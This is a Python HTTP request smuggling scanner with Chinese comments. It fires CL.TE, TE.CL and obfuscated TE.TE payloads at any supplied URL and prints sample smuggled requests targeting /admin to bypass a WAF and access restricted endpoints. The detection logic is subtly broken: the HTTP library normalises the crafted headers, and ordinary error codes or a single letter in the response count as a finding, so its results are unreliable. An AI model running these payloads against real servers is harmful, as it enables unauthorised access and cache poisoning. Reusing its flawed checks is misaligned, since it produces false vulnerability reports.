#!/usr/bin/env python3
"""
Loren's Smuggler Detector v1.0
HTTP请求走私漏洞检测工具
仅限授权测试使用，非法使用后果自负
"""

import requests
import sys
import time
from urllib.parse import urlparse

# 配置
TIMEOUT = 10
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

class SmugglerDetector:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': USER_AGENT,
            'Connection': 'keep-alive'
        })
    
    def print_banner(self):
        banner = """
╔══════════════════════════════════════════════════════╗
║     Loren's Smuggler Detector v1.0                   ║
║     HTTP请求走私漏洞检测工具                          ║
║     仅限授权测试使用                                  ║
╚══════════════════════════════════════════════════════╝
        """
        print(banner)
        print(f"[*] 目标: {self.target}\n")
    
    def test_cl_te(self):
        """
        检测 CL.TE (Content-Length 与 Transfer-Encoding 冲突)
        原理: 前端用Content-Length，后端用Transfer-Encoding
        """
        print("[*] 正在检测 CL.TE 类型请求走私...")
        
        # 恶意请求: Content-Length和Transfer-Encoding同时存在
        headers = {
            'Content-Length': '13',
            'Transfer-Encoding': 'chunked'
        }
        
        # 这个payload会让后端把后面的请求当做第二个请求的一部分
        payload = '0\r\n\r\nG'
        
        try:
            # 发送走私请求
            start_time = time.time()
            response = self.session.post(
                self.target,
                headers=headers,
                data=payload,
                timeout=TIMEOUT
            )
            elapsed = time.time() - start_time
            
            # 判断是否存在漏洞
            # 情况1: 返回异常状态码或包含特定内容
            if response.status_code in [400, 500, 502, 503]:
                print(f"[!] 发现 CL.TE 请求走私漏洞!")
                print(f"    - 响应状态码: {response.status_code}")
                return True
            
            # 情况2: 响应时间异常（可能后端被阻塞）
            if elapsed > 8:
                print(f"[!] 发现 CL.TE 请求走私漏洞 (响应延迟异常)!")
                return True
            
            # 情况3: 响应体中包含走私的内容
            if 'G' in response.text:
                print(f"[!] 发现 CL.TE 请求走私漏洞 (内容泄露)!")
                return True
                
        except requests.exceptions.Timeout:
            print(f"[!] 发现 CL.TE 请求走私漏洞 (超时)!")
            return True
        except Exception as e:
            print(f"[-] 检测出错: {e}")
            return False
        
        print("[-] 未发现 CL.TE 类型漏洞")
        return False
    
    def test_te_cl(self):
        """
        检测 TE.CL (Transfer-Encoding 与 Content-Length 冲突)
        原理: 前端用Transfer-Encoding，后端用Content-Length
        """
        print("\n[*] 正在检测 TE.CL 类型请求走私...")
        
        # 恶意请求: 同时包含Transfer-Encoding和Content-Length
        headers = {
            'Content-Length': '4',
            'Transfer-Encoding': 'chunked'
        }
        
        # 这个payload会让后端认为请求在第一个chunk就结束了
        payload = '3\r\nabc\r\n0\r\n\r\n'
        
        try:
            start_time = time.time()
            response = self.session.post(
                self.target,
                headers=headers,
                data=payload,
                timeout=TIMEOUT
            )
            elapsed = time.time() - start_time
            
            # 判断是否存在漏洞
            if response.status_code in [400, 500, 502, 503, 404]:
                print(f"[!] 发现 TE.CL 请求走私漏洞!")
                print(f"    - 响应状态码: {response.status_code}")
                return True
            
            if elapsed > 8:
                print(f"[!] 发现 TE.CL 请求走私漏洞 (响应延迟异常)!")
                return True
                
        except requests.exceptions.Timeout:
            print(f"[!] 发现 TE.CL 请求走私漏洞 (超时)!")
            return True
        except Exception as e:
            print(f"[-] 检测出错: {e}")
            return False
        
        print("[-] 未发现 TE.CL 类型漏洞")
        return False
    
    def test_te_te(self):
        """
        检测 TE.TE (Transfer-Encoding 混淆)
        原理: 通过混淆Transfer-Encoding头来欺骗前后端
        """
        print("\n[*] 正在检测 TE.TE 类型请求走私...")
        
        # 常见的混淆方式
        te_variants = [
            'Transfer-Encoding: chunked',
            'Transfer-Encoding: CHUNKED',
            'Transfer-Encoding: xchunked',
            'Transfer-Encoding: chunked',
            'Transfer-Encoding: chunked, identity',
            'Transfer-Encoding: identity, chunked',
            'Transfer-Encoding: chunked\r\nTransfer-Encoding: identity',
        ]
        
        for te_header in te_variants[:3]:  # 先测试前3种，避免请求过多
            headers = {
                'Content-Length': '13',
                'Transfer-Encoding': te_header.split(':')[1].strip()
            }
            
            payload = '0\r\n\r\nX'
            
            try:
                response = self.session.post(
                    self.target,
                    headers=headers,
                    data=payload,
                    timeout=TIMEOUT
                )
                
                if 'X' in response.text:
                    print(f"[!] 发现 TE.TE 请求走私漏洞!")
                    print(f"    - 混淆方式: {te_header}")
                    return True
                    
            except:
                continue
        
        print("[-] 未发现 TE.TE 类型漏洞")
        return False
    
    def exploit_demo(self, vuln_type):
        """
        漏洞利用演示（仅打印示例，不实际执行）
        """
        print("\n[*] 漏洞利用思路:")
        
        if vuln_type == "CL.TE":
            print("""
    1. 利用CL.TE可以污染后端缓存，导致其他用户看到敏感信息
    2. 示例请求:
        POST /api HTTP/1.1
        Host: target.com
        Content-Length: 13
        Transfer-Encoding: chunked
        
        0
        
        GET /admin HTTP/1.1
        Host: target.com
        
    3. 后续正常请求会被附加到走私的请求后面，导致越权访问
            """)
        elif vuln_type == "TE.CL":
            print("""
    1. 利用TE.CL可以绕过前端WAF，直接访问后端接口
    2. 示例请求:
        POST /api HTTP/1.1
        Host: target.com
        Content-Length: 4
        Transfer-Encoding: chunked
        
        3
        abc
        0
        
        GET /admin HTTP/1.1
        Host: target.com
        
    3. 可以用于绕过权限校验，直接访问未授权接口
            """)
        else:
            print("    - 尝试使用不同的Transfer-Encoding混淆方式")
            print("    - 结合HTTP/2.0的请求走私技术")
    
    def run(self):
        """主运行函数"""
        self.print_banner()
        
        # 先测试目标可达性
        try:
            test_response = self.session.get(self.target, timeout=5)
            print(f"[+] 目标可达，状态码: {test_response.status_code}\n")
        except:
            print("[!] 目标无法访问，请检查URL")
            return
        
        # 执行三种检测
        results = {
            'CL.TE': self.test_cl_te(),
            'TE.CL': self.test_te_cl(),
            'TE.TE': self.test_te_te()
        }
        
        # 汇总结果
        print("\n" + "="*50)
        print("[*] 检测结果汇总:")
        for vuln_type, found in results.items():
            status = "[+] 存在" if found else "[-] 不存在"
            print(f"    {vuln_type}: {status}")
        
        # 如果发现漏洞，给出利用思路
        if any(results.values()):
            vuln_type_found = [t for t, f in results.items() if f][0]
            self.exploit_demo(vuln_type_found)
        else:
            print("\n[-] 未发现HTTP请求走私漏洞")
            print("[*] 提示: 某些情况下需要结合HTTP/2.0或WebSocket进行检测")
        
        print("\n" + "="*50)
        print("[+] 检测完成")

def main():
    if len(sys.argv) < 2:
        print("用法: python smuggler.py <target_url>")
        print("示例: python smuggler.py https://example.com/api")
        sys.exit(1)
    
    target = sys.argv[1]
    
    # 验证URL格式
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    detector = SmugglerDetector(target)
    detector.run()

if __name__ == "__main__":
    main()
